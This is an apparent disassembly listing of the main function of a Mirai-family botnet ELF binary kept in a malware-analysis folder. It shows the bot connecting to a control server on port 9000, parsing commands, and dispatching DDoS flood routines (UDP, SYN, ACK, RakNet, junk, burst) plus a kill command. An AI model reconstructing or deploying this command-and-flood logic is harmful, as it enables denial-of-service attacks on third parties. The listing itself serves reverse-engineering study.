
/Users/taogoldi/Projects/Malware/Mirai/input/d40cf9c95dcedf4f19e4a5f5bb744c8e98af87eb5703c850e6fda3b613668c28.elf:	file format elf64-x86-64

Disassembly of section .text:

00000000004002a0 <main>:
  4002a0: 41 57                        	push	r15
  4002a2: 31 c9                        	xor	ecx, ecx
  4002a4: ba 30 07 40 00               	mov	edx, 0x400730
  4002a9: 31 f6                        	xor	esi, esi
  4002ab: 41 56                        	push	r14
  4002ad: 41 55                        	push	r13
  4002af: 41 54                        	push	r12
  4002b1: 55                           	push	rbp
  4002b2: 53                           	push	rbx
  4002b3: 48 81 ec a8 14 00 00         	sub	rsp, 0x14a8
  4002ba: 48 8d bc 24 88 14 00 00      	lea	rdi, [rsp + 0x1488]
  4002c2: 4c 8d b4 24 20 10 00 00      	lea	r14, [rsp + 0x1020]
  4002ca: 4c 8d 7c 24 20               	lea	r15, [rsp + 0x20]
  4002cf: e8 1c 58 00 00               	call	0x405af0 <pthread_create>
  4002d4: 31 d2                        	xor	edx, edx
  4002d6: be 01 00 00 00               	mov	esi, 0x1
  4002db: bf 02 00 00 00               	mov	edi, 0x2
  4002e0: e8 8f a5 00 00               	call	0x40a874 <socket>
  4002e5: 85 c0                        	test	eax, eax
  4002e7: 41 89 c5                     	mov	r13d, eax
  4002ea: 0f 88 5a 02 00 00            	js	0x40054a <main+0x2aa>
  4002f0: 48 8d 94 24 70 14 00 00      	lea	rdx, [rsp + 0x1470]
  4002f8: be 8a 49 41 00               	mov	esi, 0x41498a
  4002fd: bf 02 00 00 00               	mov	edi, 0x2
  400302: 66 c7 84 24 70 14 00 00 02 00	mov	word ptr [rsp + 0x1470], 0x2
  40030c: 66 c7 84 24 72 14 00 00 23 28	mov	word ptr [rsp + 0x1472], 0x2823
  400316: 48 83 c2 04                  	add	rdx, 0x4
  40031a: e8 90 9e 00 00               	call	0x40a1af <inet_pton>
  40031f: 48 8d b4 24 70 14 00 00      	lea	rsi, [rsp + 0x1470]
  400327: ba 10 00 00 00               	mov	edx, 0x10
  40032c: 44 89 ef                     	mov	edi, r13d
  40032f: e8 5c 4a 00 00               	call	0x404d90 <connect>
  400334: 85 c0                        	test	eax, eax
  400336: 0f 88 06 02 00 00            	js	0x400542 <main+0x2a2>
  40033c: 44 89 ef                     	mov	edi, r13d
  40033f: e8 7c fe ff ff               	call	0x4001c0 <verify_server_ip>
  400344: 85 c0                        	test	eax, eax
  400346: 0f 84 ec 01 00 00            	je	0x400538 <main+0x298>
  40034c: be 8a 49 41 00               	mov	esi, 0x41498a
  400351: bf f0 48 41 00               	mov	edi, 0x4148f0
  400356: 31 c0                        	xor	eax, eax
  400358: e8 73 7b 00 00               	call	0x407ed0 <printf>
  40035d: 48 8d 84 24 60 14 00 00      	lea	rax, [rsp + 0x1460]
  400365: 31 db                        	xor	ebx, ebx
  400367: 48 89 44 24 18               	mov	qword ptr [rsp + 0x18], rax
  40036c: 31 c9                        	xor	ecx, ecx
  40036e: ba 00 04 00 00               	mov	edx, 0x400
  400373: 4c 89 f6                     	mov	rsi, r14
  400376: 44 89 ef                     	mov	edi, r13d
  400379: e8 c0 49 00 00               	call	0x404d3e <recv>
  40037e: 48 83 f8 00                  	cmp	rax, 0x0
  400382: 49 89 c4                     	mov	r12, rax
  400385: 0f 84 e6 02 00 00            	je	0x400671 <main+0x3d1>
  40038b: 0f 8c c8 01 00 00            	jl	0x400559 <main+0x2b9>
  400391: 44 89 ef                     	mov	edi, r13d
  400394: e8 27 fe ff ff               	call	0x4001c0 <verify_server_ip>
  400399: 85 c0                        	test	eax, eax
  40039b: 0f 84 e7 02 00 00            	je	0x400688 <main+0x3e8>
  4003a1: 31 ed                        	xor	ebp, ebp
  4003a3: 4d 85 e4                     	test	r12, r12
  4003a6: 7f 28                        	jg	0x4003d0 <main+0x130>
  4003a8: eb c2                        	jmp	0x40036c <main+0xcc>
  4003aa: 66 66 90                     	nop
  4003ad: 66 66 90                     	nop
  4003b0: 42 0f b6 54 35 00            	movzx	edx, byte ptr [rbp + r14]
  4003b6: 31 c0                        	xor	eax, eax
  4003b8: bb 01 00 00 00               	mov	ebx, 0x1
  4003bd: 48 98                        	cdqe
  4003bf: 80 fa 0a                     	cmp	dl, 0xa
  4003c2: 88 54 04 20                  	mov	byte ptr [rsp + rax + 0x20], dl
  4003c6: 74 25                        	je	0x4003ed <main+0x14d>
  4003c8: 48 ff c5                     	inc	rbp
  4003cb: 49 39 ec                     	cmp	r12, rbp
  4003ce: 74 9c                        	je	0x40036c <main+0xcc>
  4003d0: 81 fb fe 0f 00 00            	cmp	ebx, 0xffe
  4003d6: 7f d8                        	jg	0x4003b0 <main+0x110>
  4003d8: 42 0f b6 54 35 00            	movzx	edx, byte ptr [rbp + r14]
  4003de: 89 d8                        	mov	eax, ebx
  4003e0: ff c3                        	inc	ebx
  4003e2: 48 98                        	cdqe
  4003e4: 80 fa 0a                     	cmp	dl, 0xa
  4003e7: 88 54 04 20                  	mov	byte ptr [rsp + rax + 0x20], dl
  4003eb: 75 db                        	jne	0x4003c8 <main+0x128>
  4003ed: 48 63 c3                     	movsxd	rax, ebx
  4003f0: be 0a 51 41 00               	mov	esi, 0x41510a
  4003f5: 4c 89 ff                     	mov	rdi, r15
  4003f8: c6 44 04 20 00               	mov	byte ptr [rsp + rax + 0x20], 0x0
  4003fd: e8 f6 97 00 00               	call	0x409bf8 <strcspn>
  400402: c6 44 04 20 00               	mov	byte ptr [rsp + rax + 0x20], 0x0
  400407: 80 7c 24 20 21               	cmp	byte ptr [rsp + 0x20], 0x21
  40040c: 74 04                        	je	0x400412 <main+0x172>
  40040e: 31 db                        	xor	ebx, ebx
  400410: eb b6                        	jmp	0x4003c8 <main+0x128>
  400412: fc                           	cld
  400413: b9 09 00 00 00               	mov	ecx, 0x9
  400418: 4c 89 fe                     	mov	rsi, r15
  40041b: bf c6 49 41 00               	mov	edi, 0x4149c6
  400420: f3 a6                        	rep		cmpsb	byte ptr [rsi], byte ptr es:[rdi]
  400422: 0f 84 95 01 00 00            	je	0x4005bd <main+0x31d>
  400428: 48 8d 84 24 9c 14 00 00      	lea	rax, [rsp + 0x149c]
  400430: 4c 8d 8c 24 94 14 00 00      	lea	r9, [rsp + 0x1494]
  400438: 4c 8d 84 24 98 14 00 00      	lea	r8, [rsp + 0x1498]
  400440: 48 8d 8c 24 20 14 00 00      	lea	rcx, [rsp + 0x1420]
  400448: 48 8d 94 24 60 14 00 00      	lea	rdx, [rsp + 0x1460]
  400450: be cf 49 41 00               	mov	esi, 0x4149cf
  400455: 48 89 04 24                  	mov	qword ptr [rsp], rax
  400459: 4c 89 ff                     	mov	rdi, r15
  40045c: 31 c0                        	xor	eax, eax
  40045e: e8 7d 8e 00 00               	call	0x4092e0 <sscanf>
  400463: 83 f8 05                     	cmp	eax, 0x5
  400466: 74 23                        	je	0x40048b <main+0x1eb>
  400468: fc                           	cld
  400469: bf 28 4a 41 00               	mov	edi, 0x414a28
  40046e: b9 07 00 00 00               	mov	ecx, 0x7
  400473: 4c 89 fe                     	mov	rsi, r15
  400476: f3 a6                        	rep		cmpsb	byte ptr [rsi], byte ptr es:[rdi]
  400478: 75 94                        	jne	0x40040e <main+0x16e>
  40047a: bf 2f 4a 41 00               	mov	edi, 0x414a2f
  40047f: 31 db                        	xor	ebx, ebx
  400481: e8 c6 79 00 00               	call	0x407e4c <puts>
  400486: e9 3d ff ff ff               	jmp	0x4003c8 <main+0x128>
  40048b: 8b 8c 24 98 14 00 00         	mov	ecx, dword ptr [rsp + 0x1498]
  400492: 44 8b 8c 24 9c 14 00 00      	mov	r9d, dword ptr [rsp + 0x149c]
  40049a: 48 8d b4 24 60 14 00 00      	lea	rsi, [rsp + 0x1460]
  4004a2: 44 8b 84 24 94 14 00 00      	mov	r8d, dword ptr [rsp + 0x1494]
  4004aa: 48 8d 94 24 20 14 00 00      	lea	rdx, [rsp + 0x1420]
  4004b2: bf 60 49 41 00               	mov	edi, 0x414960
  4004b7: 31 c0                        	xor	eax, eax
  4004b9: e8 12 7a 00 00               	call	0x407ed0 <printf>
  4004be: 48 8b 74 24 18               	mov	rsi, qword ptr [rsp + 0x18]
  4004c3: bf e7 49 41 00               	mov	edi, 0x4149e7
  4004c8: b9 04 00 00 00               	mov	ecx, 0x4
  4004cd: fc                           	cld
  4004ce: f3 a6                        	rep		cmpsb	byte ptr [rsi], byte ptr es:[rdi]
  4004d0: 75 29                        	jne	0x4004fb <main+0x25b>
  4004d2: 8b 8c 24 9c 14 00 00         	mov	ecx, dword ptr [rsp + 0x149c]
  4004d9: 8b 94 24 94 14 00 00         	mov	edx, dword ptr [rsp + 0x1494]
  4004e0: 48 8d bc 24 20 14 00 00      	lea	rdi, [rsp + 0x1420]
  4004e8: 8b b4 24 98 14 00 00         	mov	esi, dword ptr [rsp + 0x1498]
  4004ef: 31 db                        	xor	ebx, ebx
  4004f1: e8 8a 0e 00 00               	call	0x401380 <method_udp>
  4004f6: e9 cd fe ff ff               	jmp	0x4003c8 <main+0x128>
  4004fb: 48 8b 74 24 18               	mov	rsi, qword ptr [rsp + 0x18]
  400500: bf eb 49 41 00               	mov	edi, 0x4149eb
  400505: b9 04 00 00 00               	mov	ecx, 0x4
  40050a: fc                           	cld
  40050b: f3 a6                        	rep		cmpsb	byte ptr [rsi], byte ptr es:[rdi]
  40050d: 75 71                        	jne	0x400580 <main+0x2e0>
  40050f: 8b 8c 24 9c 14 00 00         	mov	ecx, dword ptr [rsp + 0x149c]
  400516: 8b 94 24 94 14 00 00         	mov	edx, dword ptr [rsp + 0x1494]
  40051d: 48 8d bc 24 20 14 00 00      	lea	rdi, [rsp + 0x1420]
  400525: 8b b4 24 98 14 00 00         	mov	esi, dword ptr [rsp + 0x1498]
  40052c: 31 db                        	xor	ebx, ebx
  40052e: e8 7d 22 00 00               	call	0x4027b0 <method_syn>
  400533: e9 90 fe ff ff               	jmp	0x4003c8 <main+0x128>
  400538: bf c0 48 41 00               	mov	edi, 0x4148c0
  40053d: e8 0a 79 00 00               	call	0x407e4c <puts>
  400542: 44 89 ef                     	mov	edi, r13d
  400545: e8 f4 4d 00 00               	call	0x40533e <close>
  40054a: bf 02 00 00 00               	mov	edi, 0x2
  40054f: e8 b0 be 00 00               	call	0x40c404 <sleep>
  400554: e9 7b fd ff ff               	jmp	0x4002d4 <main+0x34>
  400559: e8 7d 23 00 00               	call	0x4028db <__errno_location>
  40055e: 8b 00                        	mov	eax, dword ptr [rax]
  400560: 83 f8 04                     	cmp	eax, 0x4
  400563: 0f 94 c2                     	sete	dl
  400566: 83 f8 0b                     	cmp	eax, 0xb
  400569: 0f 94 c0                     	sete	al
  40056c: 08 c2                        	or	dl, al
  40056e: 0f 85 f8 fd ff ff            	jne	0x40036c <main+0xcc>
  400574: bf b7 49 41 00               	mov	edi, 0x4149b7
  400579: e8 9e 78 00 00               	call	0x407e1c <perror>
  40057e: eb c2                        	jmp	0x400542 <main+0x2a2>
  400580: 48 8b 74 24 18               	mov	rsi, qword ptr [rsp + 0x18]
  400585: bf ef 49 41 00               	mov	edi, 0x4149ef
  40058a: b9 04 00 00 00               	mov	ecx, 0x4
  40058f: fc                           	cld
  400590: f3 a6                        	rep		cmpsb	byte ptr [rsi], byte ptr es:[rdi]
  400592: 75 47                        	jne	0x4005db <main+0x33b>
  400594: 8b 8c 24 9c 14 00 00         	mov	ecx, dword ptr [rsp + 0x149c]
  40059b: 8b 94 24 94 14 00 00         	mov	edx, dword ptr [rsp + 0x1494]
  4005a2: 48 8d bc 24 20 14 00 00      	lea	rdi, [rsp + 0x1420]
  4005aa: 8b b4 24 98 14 00 00         	mov	esi, dword ptr [rsp + 0x1498]
  4005b1: 31 db                        	xor	ebx, ebx
  4005b3: e8 18 21 00 00               	call	0x4026d0 <method_ack>
  4005b8: e9 0b fe ff ff               	jmp	0x4003c8 <main+0x128>
  4005bd: 31 c0                        	xor	eax, eax
  4005bf: e8 9c fc ff ff               	call	0x400260 <force_sigkill>
  4005c4: 48 81 c4 a8 14 00 00         	add	rsp, 0x14a8
  4005cb: b8 89 00 00 00               	mov	eax, 0x89
  4005d0: 5b                           	pop	rbx
  4005d1: 5d                           	pop	rbp
  4005d2: 41 5c                        	pop	r12
  4005d4: 41 5d                        	pop	r13
  4005d6: 41 5e                        	pop	r14
  4005d8: 41 5f                        	pop	r15
  4005da: c3                           	ret
  4005db: 48 8b 74 24 18               	mov	rsi, qword ptr [rsp + 0x18]
  4005e0: bf f3 49 41 00               	mov	edi, 0x4149f3
  4005e5: b9 08 00 00 00               	mov	ecx, 0x8
  4005ea: fc                           	cld
  4005eb: f3 a6                        	rep		cmpsb	byte ptr [rsi], byte ptr es:[rdi]
  4005ed: 74 59                        	je	0x400648 <main+0x3a8>
  4005ef: 48 8b 74 24 18               	mov	rsi, qword ptr [rsp + 0x18]
  4005f4: bf fb 49 41 00               	mov	edi, 0x4149fb
  4005f9: b9 05 00 00 00               	mov	ecx, 0x5
  4005fe: fc                           	cld
  4005ff: f3 a6                        	rep		cmpsb	byte ptr [rsi], byte ptr es:[rdi]
  400601: 0f 84 a0 00 00 00            	je	0x4006a7 <main+0x407>
  400607: 48 8b 74 24 18               	mov	rsi, qword ptr [rsp + 0x18]
  40060c: bf 00 4a 41 00               	mov	edi, 0x414a00
  400611: b9 07 00 00 00               	mov	ecx, 0x7
  400616: fc                           	cld
  400617: f3 a6                        	rep		cmpsb	byte ptr [rsi], byte ptr es:[rdi]
  400619: 0f 85 b1 00 00 00            	jne	0x4006d0 <main+0x430>
  40061f: 8b 8c 24 9c 14 00 00         	mov	ecx, dword ptr [rsp + 0x149c]
  400626: 8b 94 24 94 14 00 00         	mov	edx, dword ptr [rsp + 0x1494]
  40062d: 48 8d bc 24 20 14 00 00      	lea	rdi, [rsp + 0x1420]
  400635: 8b b4 24 98 14 00 00         	mov	esi, dword ptr [rsp + 0x1498]
  40063c: 31 db                        	xor	ebx, ebx
  40063e: e8 5d 0a 00 00               	call	0x4010a0 <method_raknet>
  400643: e9 80 fd ff ff               	jmp	0x4003c8 <main+0x128>
  400648: 8b 8c 24 9c 14 00 00         	mov	ecx, dword ptr [rsp + 0x149c]
  40064f: 8b 94 24 94 14 00 00         	mov	edx, dword ptr [rsp + 0x1494]
  400656: 48 8d bc 24 20 14 00 00      	lea	rdi, [rsp + 0x1420]
  40065e: 8b b4 24 98 14 00 00         	mov	esi, dword ptr [rsp + 0x1498]
  400665: 31 db                        	xor	ebx, ebx
  400667: e8 14 0c 00 00               	call	0x401280 <method_udpslam>
  40066c: e9 57 fd ff ff               	jmp	0x4003c8 <main+0x128>
  400671: bf 9a 49 41 00               	mov	edi, 0x41499a
  400676: e8 d1 77 00 00               	call	0x407e4c <puts>
  40067b: 44 89 ef                     	mov	edi, r13d
  40067e: e8 bb 4c 00 00               	call	0x40533e <close>
  400683: e9 c2 fe ff ff               	jmp	0x40054a <main+0x2aa>
  400688: bf 20 49 41 00               	mov	edi, 0x414920
  40068d: e8 ba 77 00 00               	call	0x407e4c <puts>
  400692: 44 89 ef                     	mov	edi, r13d
  400695: e8 a4 4c 00 00               	call	0x40533e <close>
  40069a: 44 89 ef                     	mov	edi, r13d
  40069d: e8 9c 4c 00 00               	call	0x40533e <close>
  4006a2: e9 a3 fe ff ff               	jmp	0x40054a <main+0x2aa>
  4006a7: 8b 8c 24 9c 14 00 00         	mov	ecx, dword ptr [rsp + 0x149c]
  4006ae: 8b 94 24 94 14 00 00         	mov	edx, dword ptr [rsp + 0x1494]
  4006b5: 48 8d bc 24 20 14 00 00      	lea	rdi, [rsp + 0x1420]
  4006bd: 8b b4 24 98 14 00 00         	mov	esi, dword ptr [rsp + 0x1498]
  4006c4: 31 db                        	xor	ebx, ebx
  4006c6: e8 c5 0a 00 00               	call	0x401190 <method_junk>
  4006cb: e9 f8 fc ff ff               	jmp	0x4003c8 <main+0x128>
  4006d0: 48 8b 74 24 18               	mov	rsi, qword ptr [rsp + 0x18]
  4006d5: bf 07 4a 41 00               	mov	edi, 0x414a07
  4006da: b9 09 00 00 00               	mov	ecx, 0x9
  4006df: fc                           	cld
  4006e0: f3 a6                        	rep		cmpsb	byte ptr [rsi], byte ptr es:[rdi]
  4006e2: 75 29                        	jne	0x40070d <main+0x46d>
  4006e4: 8b 8c 24 9c 14 00 00         	mov	ecx, dword ptr [rsp + 0x149c]
  4006eb: 8b 94 24 94 14 00 00         	mov	edx, dword ptr [rsp + 0x1494]
  4006f2: 48 8d bc 24 20 14 00 00      	lea	rdi, [rsp + 0x1420]
  4006fa: 8b b4 24 98 14 00 00         	mov	esi, dword ptr [rsp + 0x1498]
  400701: 31 db                        	xor	ebx, ebx
  400703: e8 58 08 00 00               	call	0x400f60 <method_udpburst>
  400708: e9 bb fc ff ff               	jmp	0x4003c8 <main+0x128>
  40070d: 48 8d b4 24 60 14 00 00      	lea	rsi, [rsp + 0x1460]
  400715: bf 10 4a 41 00               	mov	edi, 0x414a10
  40071a: 31 c0                        	xor	eax, eax
  40071c: 31 db                        	xor	ebx, ebx
  40071e: e8 ad 77 00 00               	call	0x407ed0 <printf>
  400723: e9 a0 fc ff ff               	jmp	0x4003c8 <main+0x128>
  400728: 66 66 66 90                  	nop
  40072c: 66 66 66 90                  	nop
